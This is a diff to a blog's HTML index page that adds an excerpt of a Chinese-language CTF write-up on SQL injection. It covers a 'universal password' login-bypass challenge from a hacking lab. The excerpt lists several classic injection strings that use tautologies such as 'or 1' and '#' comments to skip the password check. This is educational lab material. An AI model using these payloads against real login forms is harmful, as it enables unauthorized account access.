@@ -140,6 +140,46 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2019/12/22/SQL%E6%B3%A8%E5%85%A5/">
+        <p class="h4 index-header">SQL注入</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">万能密码—very easy题目入口：http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php 
+题目来源：hacking lab inject 01~
+
+源代码有提示：
+
+&lt;!--ps login as admin–&gt;
+
+万能密码登录语句构造： 
+select * from admin where username=’admin’and 1=1 #’ and password=’123456′ 
+OR 
+select * from admin where username=’admin’or 1 #’ and password=’123456′ 
+或者不需要admin 
+select * from admin where username=’1′or 1 or 1 #’ and password=’123456′ 
+还可以用#来注释 
+select * from admin where username=’admin’#’ and password=’123456′
+万能密码题目入口：</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-22&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2019/12/22/Jarvis-OJ-admin/">
         <p class="h4 index-header">Jarvis OJ admin</p>
         
